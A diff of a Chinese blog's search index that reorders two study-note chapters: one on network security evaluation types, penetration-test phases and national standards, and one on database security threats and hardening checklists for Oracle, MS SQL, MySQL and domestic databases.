-<li>限制连接Oracle的IP地址</li>
-<li>传输加密</li>
-<li>启用Oracle审计</li>
-<li>定期查看Oracle漏洞发布信息</li>
-<li>实施Oracle灾备计划</li>
-</ol>
-<h1 id="MS-SQL数据库安全分析与防护"><a href="#MS-SQL数据库安全分析与防护" class="headerlink" title="MS SQL数据库安全分析与防护"></a>MS SQL数据库安全分析与防护</h1><h2 id="MS-SQL安全分析"><a href="#MS-SQL安全分析" class="headerlink" title="MS SQL安全分析"></a>MS SQL安全分析</h2><p>安全机制：</p>
+<h1 id="网络安全测评类型"><a href="#网络安全测评类型" class="headerlink" title="网络安全测评类型"></a>网络安全测评类型</h1><h2 id="基于测评目标分类"><a href="#基于测评目标分类" class="headerlink" title="基于测评目标分类"></a>基于测评目标分类</h2><p>按照测评目标，分为三种类型：</p>
 <ol>
-<li><p>用户身份认证</p>
+<li><p>网络信息系统安全等级测评</p>
+<p>依据国家网络安全等级保护相关法律法规，主要检测和评估安全技术、安全管理</p>
 </li>
-<li><p>访问控制：基于角色的访问控制</p>
+<li><p>网络信息系统安全验收测评</p>
+<p>根据用户申请的项目验收目标和验收范围</p>
 </li>
-<li><p>数据库加密</p>
-<p><img src="/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/MSSQL透明加密.jpg" style="zoom:50%;"></p>
-</li>
-<li><p>备份、恢复机制</p>
-</li>
-<li><p>安全审计</p>
+<li><p>网络信息系统安全风险测评</p>
+<p>内容包括系统调查、资产分析、威胁分析、技术及管理脆弱性分析、安全功能测试、风险分析</p>
 </li>
 </ol>
-<h2 id="MS-SQL-Server安全最佳实践"><a href="#MS-SQL-Server安全最佳实践" class="headerlink" title="MS SQL Server安全最佳实践"></a>MS SQL Server安全最佳实践</h2><ol>
-<li>设置好的数据库密码安全策略</li>
-<li>加强扩展存储过程管理，删除不必要存储过程</li>
-<li>网上数据加密传输</li>
-<li>修改数据库默认的TCP/IP端口号</li>
-<li>对SQL数据库访问的网络连接进行IP限制</li>
-<li>启用SQL Server日志审计，记录所有的用户访问和分析安全事件日志</li>
-<li>定期查看MS SQL Server漏洞发布信息，及时修补漏洞</li>
-<li>保证MS SQL Server的操作系统安全</li>
-<li>MS SQL Server安全检测，制定安全容灾备份计划</li>
+<h2 id="基于测评内容分类"><a href="#基于测评内容分类" class="headerlink" title="基于测评内容分类"></a>基于测评内容分类</h2><p>技术安全测评：物理环境、网络通信、操作系统、数据库系统、应用系统、数据及存储系统等</p>
+<p>管理安全测评：管理机构、管理制度、管理流程、人员管理、系统建设、系统运维等</p>
+<h2 id="基于实施方式分类"><a href="#基于实施方式分类" class="headerlink" title="基于实施方式分类"></a>基于实施方式分类</h2><ol>
+<li><p>安全功能检测</p>
+<p>主要方法：访谈调研、现场查看、文档审查、社会工程、漏洞扫描、渗透测试、形式化分析验证</p>
+</li>
+<li><p>安全管理检测</p>
+<p>主要方法：访谈调研、现场查看、文档审查、安全基线对比、社会工程</p>
+</li>
+<li><p>代码安全审查</p>
+</li>
+<li><p>安全渗透测试</p>
+</li>
+<li><p>信息系统攻击测试</p>
+<p>测试指标：防御攻击等种类与能力</p>
+</li>
 </ol>
-<h1 id="MySQL数据库安全分析与防护"><a href="#MySQL数据库安全分析与防护" class="headerlink" title="MySQL数据库安全分析与防护"></a>MySQL数据库安全分析与防护</h1><h2 id="MySQL安全分析"><a href="#MySQL安全分析" class="headerlink" title="MySQL安全分析"></a>MySQL安全分析</h2><p>安全机制包括：</p>
-<ul>
-<li>用户身份认证</li>
-<li>访问授权：user、db、host、tables_priv和columns_priv5个授权表</li>
-<li>安全审计</li>
+<h2 id="基于测评对象保密性分类"><a href="#基于测评对象保密性分类" class="headerlink" title="基于测评对象保密性分类"></a>基于测评对象保密性分类</h2><ol>
+<li>涉密信息系统测评</li>
+<li>非涉密信息系统测评</li>
+</ol>
+<h1 id="网络安全测评流程与内容"><a href="#网络安全测评流程与内容" class="headerlink" title="网络安全测评流程与内容"></a>网络安全测评流程与内容</h1><h2 id="网络安全等级保护测评流程与内容"><a href="#网络安全等级保护测评流程与内容" class="headerlink" title="网络安全等级保护测评流程与内容"></a>网络安全等级保护测评流程与内容</h2><p><img src="/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/等保测评内容.jpg" style="zoom:50%;"></p>
+<p>过程：测评准备活动、方案编制活动、现场测评活动、报告编制活动</p>
+<h2 id="网络安全渗透测试流程与内容"><a href="#网络安全渗透测试流程与内容" class="headerlink" title="网络安全渗透测试流程与内容"></a>网络安全渗透测试流程与内容</h2><ol>
+<li><p>委托受理阶段</p>
+<p>确认目标、签署合同和保密协议</p>
+</li>
+<li><p>准备阶段</p>
+<p>签订授权书，制定方案</p>
+</li>
+<li><p>实施阶段</p>
+<p>执行测试，完成后整理报告</p>
+</li>
+<li><p>综合评估阶段</p>
+<p>汇总分析，报告评审。复测并出具报告。</p>
+</li>
+<li><p>结题阶段</p>
+<p>提交生成的各类文档记录</p>
+</li>
+</ol>
+<h1 id="网络安全测评技术与工具"><a href="#网络安全测评技术与工具" class="headerlink" title="网络安全测评技术与工具"></a>网络安全测评技术与工具</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>常用漏洞扫描工具：网络安全漏洞扫描器、主机安全漏洞扫描器、数据库安全漏洞扫描器、Web应用安全漏洞扫描器。</p>
+<h2 id="安全渗透测试"><a href="#安全渗透测试" class="headerlink" title="安全渗透测试"></a>安全渗透测试</h2><p>三种类型：</p>
+<ol>
+<li>黑盒模型</li>
+<li>白盒模型</li>
+<li>灰盒模型</li>
+</ol>
+<h2 id="代码安全审查"><a href="#代码安全审查" class="headerlink" title="代码安全审查"></a>代码安全审查</h2><p>代码安全缺陷类型：缓冲区溢出、代码注入、跨站脚本、输入验证、API误用、密码管理、配置错误、危险函数等。</p>
+<h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p><strong>TCPDump使用</strong>详见P386-P389</p>
+<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>常用工具：新年监测工具（系统自带）、Apache JMeter（开源）、LoadRunner、SmartBits</p>
+<h1 id="网络安全测评质量管理与标准"><a href="#网络安全测评质量管理与标准" class="headerlink" title="网络安全测评质量管理与标准"></a>网络安全测评质量管理与标准</h1><h2 id="网络安全测评质量管理"><a href="#网络安全测评质量管理" class="headerlink" title="网络安全测评质量管理"></a>网络安全测评质量管理</h2><p>工作包括：测评机构建立质量管理体系、测评实施人员管理、测评实施设备管理、测评实施方法管理、测评实施文件控制、测评非符合性工作控制、体系运行监督、持续改进。</p>
+<h2 id="网络安全测评标准"><a href="#网络安全测评标准" class="headerlink" title="网络安全测评标准"></a>网络安全测评标准</h2><ol>
+<li>信息系统安全等级保护测评标准<ul>
+<li>计算机信息系统 安全保护等级划分准则（GB 17859-1999）</li>
+<li>信息安全技术 网络安全等级保护基本要求（GB/T 22239-2019）</li>
+<li>信息安全技术 网络安全等级保护定级指南（GB/T 22240-2020）</li>
+<li>信息安全技术 网络安全等级保护安全设计技术要求（GB/T25070-2019）</li>
+<li>信息安全技术 网络安全等级保护实施指南（GB/T 25058-2019）</li>
+<li>信息安全技术 信息系统安全工程管理要求（GB/T 20282-2006）</li>
+<li>信息安全技术 应用软件系统安全等级保护通用技术指南（GA/T 711-2007）</li>
+<li>信息安全技术 网络安全等级保护级别要求 第2部分：云计算安全扩展要求（GA/T 1390.2-2017）</li>
+<li>信息安全技术 网络安全等级保护级别要求 第3部分：移动互联安全扩展要求（GA/T 1390.3-2017）</li>
+<li>信息安全技术 网络安全等级保护级别要求 第5部分：工业控制系统安全扩展要求（GA/T 1390.5-2017）</li>
 </ul>
-<h2 id="MySQL安全最佳实践"><a href="#MySQL安全最佳实践" class="headerlink" title="MySQL安全最佳实践"></a>MySQL安全最佳实践</h2><ol>
-<li>MySQL安装</li>
-<li>建立MySQL Chrooting运行环境</li>
-<li>关闭MySQL的远程连接</li>
-<li>禁止MySQL导入本地文件</li>
-<li>修改MySQL的root用户ID和密码</li>
-<li>删除MySQL的默认用户和db</li>
-<li>更改MySQL的root用户吗，防止口令暴力破解</li>
-<li>建立应用程序独立使用数据库的用户账号</li>
-<li>安全检测</li>
-<li>安全备份</li>
-</ol>
-<h1 id="国产数据库安全分析与防护"><a href="#国产数据库安全分析与防护" class="headerlink" title="国产数据库安全分析与防护"></a>国产数据库安全分析与防护</h1><h2 id="国产数据库安全分析"><a href="#国产数据库安全分析" class="headerlink" title="国产数据库安全分析"></a>国产数据库安全分析</h2><ol>
-<li>国产数据库安全漏洞</li>
-<li>国产数据库依赖第三方系统组件的安全</li>
-<li>国产数据库系统安全配置的安全</li>
-<li>国产数据库支持平台的安全</li>
-</ol>
-<h2 id="国产数据库安全增强措施"><a href="#国产数据库安全增强措施" class="headerlink" title="国产数据库安全增强措施"></a>国产数据库安全增强措施</h2><ol>
-<li>国产数据库安全漏洞挖掘及扫描</li>
-<li>国产数据库加密</li>
-<li>国产安全数据库</li>
+</li>
+<li>产品测评标准<ul>
+<li>信息技术 安全技术 信息技术安全评估准则（GB/T 18336-2015）</li>
+<li>信息安全技术 路由器安全技术要求（GB/T 18018-2019）</li>
+<li>信息安全技术 路由器安全评估准则（GB/T 20011-2005）</li>
+<li>信息安全技术 服务器安全技术要求（GB/T 21028-2007）</li>
+<li>信息安全技术 服务器安全测评要求（GB/T 25063-2010）</li>
+<li>信息安全技术 网络交换机安全技术要求（GB/T 21050-2019）</li>
+<li>信息安全技术 数据库管理系统安全评估准则（GB/T 20009-2019）</li>
+<li>信息安全技术 数据库管理系统安全技术要求（GB/T 20273-2019）</li>
+<li>信息安全技术 操作系统安全评估准则（GB/T 20008-2005）</li>
+<li>信息安全技术 操作系统安全技术要求（GB/T 20272-2019）</li>
+<li>信息安全技术 网络入侵监测系统技术要求和测评评价方法（GB/T20275-2013）</li>
+<li>信息安全技术 网络和终端隔离产品测试评价方法（GB/T 20277-2015）</li>
+<li>信息安全技术 网络脆弱性扫描产品测试评价方法（GB/T 20280-2006）</li>
+<li>信息安全技术 防火墙安全技术要求和测试评价方法（GB/T 20281-2020）</li>
+<li>信息安全技术 Web应用防火墙安全技术要求与测试评价方法（GB/T 32917-2016）</li>
+<li>信息安全技术 信息系统安全审计产品技术要求和测试评价方法（GB/T 20945-2013）</li>
+<li>信息安全技术 网络型入侵防御产品技术要求和测试评价方法（GB/T 28451-2012）</li>
+<li>信息安全技术 数据备份与恢复产品技术要求与测试评价方法（GB/T 29765-2013）</li>
+<li>信息安全技术 信息系统安全管理平台技术要求和测试评价方法（GB/T 34990-2017）</li>
+<li>信息安全技术 移动终端安全保护技术要求（GB/T 35278-2017）</li>
+</ul>
+</li>
+<li>信息安全风险评估标准<ul>
+<li>信息安全技术 信息安全风险评估规范（GB/T 20984-2007）</li>
+<li>信息安全技术 信息安全风险评估实施指南（GB/T 31509-2015）</li>
+<li>信息安全技术 信息安全风险处理实施指南（GB/T 33132-2016）</li>
+</ul>
+</li>
+<li>密码应用安全<ul>
+<li>安全芯片密码检测准则（GM/T 0008-2012）</li>
+<li>可信计算 可信密码模块符合性检测规范（GM/T 0013-2012）</li>
+<li>密码模块安全技术要求（GM/T 0028-2014）</li>
+<li>服务器密码机技术规范（GM/T 0030-2014）</li>
+<li>基于角色的授权管理与访问控制技术规范（GM/T 0032-2014）</li>
+<li>证书认证系统检测规范（GM/T 0037-2014）</li>
+<li>密码模块安全检测要求（GM/T 0039-2015）</li>
+<li>数字证书互操作检测规范（GM/T 0043-2015）</li>
+<li>金融数据密码机检测规范（GM/T 0046-2016）</li>
+</ul>
+</li>
+<li>工业控制系统信息安全防护能力评估<ul>
+<li>工业控制系统信息安全防护指南（工信部信软（2016）338号）</li>
+<li>工业控制系统信息安全防护能力评估工作管理办法（工信部信软（2017）188号）</li>
+</ul>
+</li>
 </ol>
 ]]></content>
       <categories>
@@ -3666,134 +3669,131 @@ Dec[En(a)⊙En(b)]=a⊕b</script><p>En加密运算，Dec解密运算，当$⊕$�
       </tags>
   </entry>
   <entry>
-    <title>第18章 网络安全测评技术与标准</title>
-    <url>/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/</url>
-    <content><![CDATA[<h1 id="网络安全测评概况"><a href="#网络安全测评概况" class="headerlink" title="网络安全测评概况"></a>网络安全测评概况</h1><p>测评对象包括：信息系统的组成要素或信息系统自身</p>
-<p><img src="/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/测评对象和内容.jpg" style="zoom:50%;"></p>
+    <title>第20章 数据库系统安全</title>
+    <url>/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/</url>
+    <content><![CDATA[<h1 id="数据库安全概况"><a href="#数据库安全概况" class="headerlink" title="数据库安全概况"></a>数据库安全概况</h1><h2 id="数据库安全威胁"><a href="#数据库安全威胁" class="headerlink" title="数据库安全威胁"></a>数据库安全威胁</h2><ol>
+<li>授权的误用</li>
+<li>逻辑推断和汇聚：不敏感数据汇聚推断出敏感数据</li>
+<li>伪装</li>
+<li>旁路控制</li>
+<li>隐蔽信道</li>
+<li>SQL注入攻击</li>
+<li>数据库口令密码破解</li>
+<li>硬件及介质攻击</li>
+</ol>
 <a id="more"></a>
-<h1 id="网络安全测评类型"><a href="#网络安全测评类型" class="headerlink" title="网络安全测评类型"></a>网络安全测评类型</h1><h2 id="基于测评目标分类"><a href="#基于测评目标分类" class="headerlink" title="基于测评目标分类"></a>基于测评目标分类</h2><p>按照测评目标，分为三种类型：</p>
+<h2 id="数据库安全隐患"><a href="#数据库安全隐患" class="headerlink" title="数据库安全隐患"></a>数据库安全隐患</h2><ol>
+<li>数据库用户账号和密码隐患</li>
+<li>数据库系统扩展存储过程隐患</li>
+<li>数据库系统软件和应用程序漏洞</li>
+<li>数据库系统权限分配隐患</li>
+<li>数据库系统用户安全意识薄弱</li>
+<li>网络通信内容是明文传递</li>
+<li>数据库系统安全机制不健全</li>
+</ol>
+<h2 id="数据库安全需求"><a href="#数据库安全需求" class="headerlink" title="数据库安全需求"></a>数据库安全需求</h2><ol>
+<li>数据库标识与鉴别</li>
+<li>数据库访问控制</li>
+<li>数据库安全审计</li>
+<li>数据库备份与恢复</li>
+<li>数据库加密</li>
+<li>资源限制</li>
+<li>数据库安全加固</li>
+<li>数据库安全管理</li>
+</ol>
+<h1 id="数据库安全机制与实现技术"><a href="#数据库安全机制与实现技术" class="headerlink" title="数据库安全机制与实现技术"></a>数据库安全机制与实现技术</h1><h2 id="数据库安全机制"><a href="#数据库安全机制" class="headerlink" title="数据库安全机制"></a>数据库安全机制</h2><p><img src="/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/安全机制.jpg" style="zoom:50%;"></p>
+<h2 id="数据库加密"><a href="#数据库加密" class="headerlink" title="数据库加密"></a>数据库加密</h2><p>加密方式：</p>
+<ul>
+<li>数据库网上传输的数据，通常利用SSL协议来实现</li>
+<li>数据库存储的数据，通过数据库存储加密来实现</li>
+</ul>
+<p>数据库存储加密方式：库内加密和库外加密</p>
+<p>常用技术：基于文件的数据库加密技术、基于记录的数据库机密技术、基于字段的数据库文件进行加密</p>
+<h2 id="数据库防火墙"><a href="#数据库防火墙" class="headerlink" title="数据库防火墙"></a>数据库防火墙</h2><p>安全作用：</p>
+<ul>
+<li>屏蔽直接访问数据库的通道</li>
+<li>增强认证</li>
+<li>攻击检测</li>
+<li>防止漏洞利用</li>
+<li>防止内部高危操作</li>
+<li>防止敏感数据泄露</li>
+<li>数据库安全审计</li>
+</ul>
+<h2 id="数据库脱敏"><a href="#数据库脱敏" class="headerlink" title="数据库脱敏"></a>数据库脱敏</h2><p>常见技术方法：屏蔽、变形、替换、随机、加密</p>
+<h1 id="Oracle数据库安全分析与防护"><a href="#Oracle数据库安全分析与防护" class="headerlink" title="Oracle数据库安全分析与防护"></a>Oracle数据库安全分析与防护</h1><h2 id="Oracle数据库安全分析"><a href="#Oracle数据库安全分析" class="headerlink" title="Oracle数据库安全分析"></a>Oracle数据库安全分析</h2><p>安全机制和技术：用户认证、访问控制（网络和数据对象授权控制）、特权管理、安全审计和数据库防火墙、透明加密</p>
+<h2 id="Oracle数据库安全最佳实践"><a href="#Oracle数据库安全最佳实践" class="headerlink" title="Oracle数据库安全最佳实践"></a>Oracle数据库安全最佳实践</h2><ol>
+<li>增强Oracle数据库服务器的操作系统安全</li>
+<li>最小化安装Oracle，删除不必要组件</li>
+<li>安装最新的安全补丁</li>
+<li>删除或修改默认的用户名和密码</li>
+<li>启用认证机制</li>
+<li>设置好的口令密码策略</li>
+<li>设置最小化权限<ul>
+<li>UTL_FILE：读取服务器上文件</li>
+<li>UTL_HTTP：通过HTTP访问外部资源</li>
+<li>UTL_TCP：通过TCP建立连接，从网络得到可执行文件</li>
+<li>UTL_SMTP：通过SMTP转发关键文件</li>
+</ul>
+</li>
+<li>限制连接Oracle的IP地址</li>
+<li>传输加密</li>
+<li>启用Oracle审计</li>
+<li>定期查看Oracle漏洞发布信息</li>
+<li>实施Oracle灾备计划</li>
+</ol>
+<h1 id="MS-SQL数据库安全分析与防护"><a href="#MS-SQL数据库安全分析与防护" class="headerlink" title="MS SQL数据库安全分析与防护"></a>MS SQL数据库安全分析与防护</h1><h2 id="MS-SQL安全分析"><a href="#MS-SQL安全分析" class="headerlink" title="MS SQL安全分析"></a>MS SQL安全分析</h2><p>安全机制：</p>
 <ol>
-<li><p>网络信息系统安全等级测评</p>
-<p>依据国家网络安全等级保护相关法律法规，主要检测和评估安全技术、安全管理</p>
+<li><p>用户身份认证</p>
 </li>
-<li><p>网络信息系统安全验收测评</p>
-<p>根据用户申请的项目验收目标和验收范围</p>
+<li><p>访问控制：基于角色的访问控制</p>
 </li>
-<li><p>网络信息系统安全风险测评</p>
-<p>内容包括系统调查、资产分析、威胁分析、技术及管理脆弱性分析、安全功能测试、风险分析</p>
+<li><p>数据库加密</p>
+<p><img src="/2020/09/27/%E7%AC%AC20%E7%AB%A0-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/MSSQL透明加密.jpg" style="zoom:50%;"></p>
 </li>
-</ol>
-<h2 id="基于测评内容分类"><a href="#基于测评内容分类" class="headerlink" title="基于测评内容分类"></a>基于测评内容分类</h2><p>技术安全测评：物理环境、网络通信、操作系统、数据库系统、应用系统、数据及存储系统等</p>
-<p>管理安全测评：管理机构、管理制度、管理流程、人员管理、系统建设、系统运维等</p>
-<h2 id="基于实施方式分类"><a href="#基于实施方式分类" class="headerlink" title="基于实施方式分类"></a>基于实施方式分类</h2><ol>
-<li><p>安全功能检测</p>
-<p>主要方法：访谈调研、现场查看、文档审查、社会工程、漏洞扫描、渗透测试、形式化分析验证</p>
+<li><p>备份、恢复机制</p>
 </li>
-<li><p>安全管理检测</p>
-<p>主要方法：访谈调研、现场查看、文档审查、安全基线对比、社会工程</p>
-</li>
-<li><p>代码安全审查</p>
-</li>
-<li><p>安全渗透测试</p>
-</li>
-<li><p>信息系统攻击测试</p>
-<p>测试指标：防御攻击等种类与能力</p>
+<li><p>安全审计</p>
 </li>
 </ol>
-<h2 id="基于测评对象保密性分类"><a href="#基于测评对象保密性分类" class="headerlink" title="基于测评对象保密性分类"></a>基于测评对象保密性分类</h2><ol>
-<li>涉密信息系统测评</li>
-<li>非涉密信息系统测评</li>
+<h2 id="MS-SQL-Server安全最佳实践"><a href="#MS-SQL-Server安全最佳实践" class="headerlink" title="MS SQL Server安全最佳实践"></a>MS SQL Server安全最佳实践</h2><ol>
+<li>设置好的数据库密码安全策略</li>
+<li>加强扩展存储过程管理，删除不必要存储过程</li>
+<li>网上数据加密传输</li>
+<li>修改数据库默认的TCP/IP端口号</li>
+<li>对SQL数据库访问的网络连接进行IP限制</li>
+<li>启用SQL Server日志审计，记录所有的用户访问和分析安全事件日志</li>
+<li>定期查看MS SQL Server漏洞发布信息，及时修补漏洞</li>
+<li>保证MS SQL Server的操作系统安全</li>
+<li>MS SQL Server安全检测，制定安全容灾备份计划</li>
 </ol>
-<h1 id="网络安全测评流程与内容"><a href="#网络安全测评流程与内容" class="headerlink" title="网络安全测评流程与内容"></a>网络安全测评流程与内容</h1><h2 id="网络安全等级保护测评流程与内容"><a href="#网络安全等级保护测评流程与内容" class="headerlink" title="网络安全等级保护测评流程与内容"></a>网络安全等级保护测评流程与内容</h2><p><img src="/2020/09/25/%E7%AC%AC18%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%84%E6%8A%80%E6%9C%AF%E4%B8%8E%E6%A0%87%E5%87%86/等保测评内容.jpg" style="zoom:50%;"></p>
-<p>过程：测评准备活动、方案编制活动、现场测评活动、报告编制活动</p>
-<h2 id="网络安全渗透测试流程与内容"><a href="#网络安全渗透测试流程与内容" class="headerlink" title="网络安全渗透测试流程与内容"></a>网络安全渗透测试流程与内容</h2><ol>
-<li><p>委托受理阶段</p>
-<p>确认目标、签署合同和保密协议</p>
-</li>
-<li><p>准备阶段</p>
-<p>签订授权书，制定方案</p>
-</li>
-<li><p>实施阶段</p>
-<p>执行测试，完成后整理报告</p>
-</li>
-<li><p>综合评估阶段</p>
-<p>汇总分析，报告评审。复测并出具报告。</p>
-</li>
-<li><p>结题阶段</p>
-<p>提交生成的各类文档记录</p>
-</li>
+<h1 id="MySQL数据库安全分析与防护"><a href="#MySQL数据库安全分析与防护" class="headerlink" title="MySQL数据库安全分析与防护"></a>MySQL数据库安全分析与防护</h1><h2 id="MySQL安全分析"><a href="#MySQL安全分析" class="headerlink" title="MySQL安全分析"></a>MySQL安全分析</h2><p>安全机制包括：</p>
+<ul>
+<li>用户身份认证</li>
+<li>访问授权：user、db、host、tables_priv和columns_priv5个授权表</li>
+<li>安全审计</li>
+</ul>
+<h2 id="MySQL安全最佳实践"><a href="#MySQL安全最佳实践" class="headerlink" title="MySQL安全最佳实践"></a>MySQL安全最佳实践</h2><ol>
+<li>MySQL安装</li>
+<li>建立MySQL Chrooting运行环境</li>
+<li>关闭MySQL的远程连接</li>
+<li>禁止MySQL导入本地文件</li>
+<li>修改MySQL的root用户ID和密码</li>
+<li>删除MySQL的默认用户和db</li>
+<li>更改MySQL的root用户吗，防止口令暴力破解</li>
+<li>建立应用程序独立使用数据库的用户账号</li>
+<li>安全检测</li>
+<li>安全备份</li>
 </ol>
-<h1 id="网络安全测评技术与工具"><a href="#网络安全测评技术与工具" class="headerlink" title="网络安全测评技术与工具"></a>网络安全测评技术与工具</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>常用漏洞扫描工具：网络安全漏洞扫描器、主机安全漏洞扫描器、数据库安全漏洞扫描器、Web应用安全漏洞扫描器。</p>
-<h2 id="安全渗透测试"><a href="#安全渗透测试" class="headerlink" title="安全渗透测试"></a>安全渗透测试</h2><p>三种类型：</p>
-<ol>
-<li>黑盒模型</li>
-<li>白盒模型</li>
-<li>灰盒模型</li>
+<h1 id="国产数据库安全分析与防护"><a href="#国产数据库安全分析与防护" class="headerlink" title="国产数据库安全分析与防护"></a>国产数据库安全分析与防护</h1><h2 id="国产数据库安全分析"><a href="#国产数据库安全分析" class="headerlink" title="国产数据库安全分析"></a>国产数据库安全分析</h2><ol>
+<li>国产数据库安全漏洞</li>
+<li>国产数据库依赖第三方系统组件的安全</li>
+<li>国产数据库系统安全配置的安全</li>
+<li>国产数据库支持平台的安全</li>
 </ol>
-<h2 id="代码安全审查"><a href="#代码安全审查" class="headerlink" title="代码安全审查"></a>代码安全审查</h2><p>代码安全缺陷类型：缓冲区溢出、代码注入、跨站脚本、输入验证、API误用、密码管理、配置错误、危险函数等。</p>
-<h2 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h2><p><strong>TCPDump使用</strong>详见P386-P389</p>
-<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>常用工具：新年监测工具（系统自带）、Apache JMeter（开源）、LoadRunner、SmartBits</p>
-<h1 id="网络安全测评质量管理与标准"><a href="#网络安全测评质量管理与标准" class="headerlink" title="网络安全测评质量管理与标准"></a>网络安全测评质量管理与标准</h1><h2 id="网络安全测评质量管理"><a href="#网络安全测评质量管理" class="headerlink" title="网络安全测评质量管理"></a>网络安全测评质量管理</h2><p>工作包括：测评机构建立质量管理体系、测评实施人员管理、测评实施设备管理、测评实施方法管理、测评实施文件控制、测评非符合性工作控制、体系运行监督、持续改进。</p>
-<h2 id="网络安全测评标准"><a href="#网络安全测评标准" class="headerlink" title="网络安全测评标准"></a>网络安全测评标准</h2><ol>
-<li>信息系统安全等级保护测评标准<ul>
-<li>计算机信息系统 安全保护等级划分准则（GB 17859-1999）</li>
-<li>信息安全技术 网络安全等级保护基本要求（GB/T 22239-2019）</li>
-<li>信息安全技术 网络安全等级保护定级指南（GB/T 22240-2020）</li>
-<li>信息安全技术 网络安全等级保护安全设计技术要求（GB/T25070-2019）</li>
-<li>信息安全技术 网络安全等级保护实施指南（GB/T 25058-2019）</li>
-<li>信息安全技术 信息系统安全工程管理要求（GB/T 20282-2006）</li>
-<li>信息安全技术 应用软件系统安全等级保护通用技术指南（GA/T 711-2007）</li>
-<li>信息安全技术 网络安全等级保护级别要求 第2部分：云计算安全扩展要求（GA/T 1390.2-2017）</li>
-<li>信息安全技术 网络安全等级保护级别要求 第3部分：移动互联安全扩展要求（GA/T 1390.3-2017）</li>
-<li>信息安全技术 网络安全等级保护级别要求 第5部分：工业控制系统安全扩展要求（GA/T 1390.5-2017）</li>
-</ul>
-</li>
-<li>产品测评标准<ul>
-<li>信息技术 安全技术 信息技术安全评估准则（GB/T 18336-2015）</li>
-<li>信息安全技术 路由器安全技术要求（GB/T 18018-2019）</li>
-<li>信息安全技术 路由器安全评估准则（GB/T 20011-2005）</li>
-<li>信息安全技术 服务器安全技术要求（GB/T 21028-2007）</li>
-<li>信息安全技术 服务器安全测评要求（GB/T 25063-2010）</li>
-<li>信息安全技术 网络交换机安全技术要求（GB/T 21050-2019）</li>
-<li>信息安全技术 数据库管理系统安全评估准则（GB/T 20009-2019）</li>
-<li>信息安全技术 数据库管理系统安全技术要求（GB/T 20273-2019）</li>
-<li>信息安全技术 操作系统安全评估准则（GB/T 20008-2005）</li>
-<li>信息安全技术 操作系统安全技术要求（GB/T 20272-2019）</li>
-<li>信息安全技术 网络入侵监测系统技术要求和测评评价方法（GB/T20275-2013）</li>
-<li>信息安全技术 网络和终端隔离产品测试评价方法（GB/T 20277-2015）</li>
-<li>信息安全技术 网络脆弱性扫描产品测试评价方法（GB/T 20280-2006）</li>
-<li>信息安全技术 防火墙安全技术要求和测试评价方法（GB/T 20281-2020）</li>
-<li>信息安全技术 Web应用防火墙安全技术要求与测试评价方法（GB/T 32917-2016）</li>
-<li>信息安全技术 信息系统安全审计产品技术要求和测试评价方法（GB/T 20945-2013）</li>
-<li>信息安全技术 网络型入侵防御产品技术要求和测试评价方法（GB/T 28451-2012）</li>
-<li>信息安全技术 数据备份与恢复产品技术要求与测试评价方法（GB/T 29765-2013）</li>
-<li>信息安全技术 信息系统安全管理平台技术要求和测试评价方法（GB/T 34990-2017）</li>
-<li>信息安全技术 移动终端安全保护技术要求（GB/T 35278-2017）</li>
-</ul>
-</li>
-<li>信息安全风险评估标准<ul>
-<li>信息安全技术 信息安全风险评估规范（GB/T 20984-2007）</li>
-<li>信息安全技术 信息安全风险评估实施指南（GB/T 31509-2015）</li>
-<li>信息安全技术 信息安全风险处理实施指南（GB/T 33132-2016）</li>
-</ul>
-</li>
-<li>密码应用安全<ul>
-<li>安全芯片密码检测准则（GM/T 0008-2012）</li>
-<li>可信计算 可信密码模块符合性检测规范（GM/T 0013-2012）</li>
-<li>密码模块安全技术要求（GM/T 0028-2014）</li>
-<li>服务器密码机技术规范（GM/T 0030-2014）</li>
-<li>基于角色的授权管理与访问控制技术规范（GM/T 0032-2014）</li>
-<li>证书认证系统检测规范（GM/T 0037-2014）</li>
-<li>密码模块安全检测要求（GM/T 0039-2015）</li>
-<li>数字证书互操作检测规范（GM/T 0043-2015）</li>
-<li>金融数据密码机检测规范（GM/T 0046-2016）</li>
-</ul>
-</li>
-<li>工业控制系统信息安全防护能力评估<ul>
-<li>工业控制系统信息安全防护指南（工信部信软（2016）338号）</li>
-<li>工业控制系统信息安全防护能力评估工作管理办法（工信部信软（2017）188号）</li>
-</ul>
-</li>
+<h2 id="国产数据库安全增强措施"><a href="#国产数据库安全增强措施" class="headerlink" title="国产数据库安全增强措施"></a>国产数据库安全增强措施</h2><ol>
+<li>国产数据库安全漏洞挖掘及扫描</li>
+<li>国产数据库加密</li>
+<li>国产安全数据库</li>
 </ol>
 ]]></content>
       <categories>
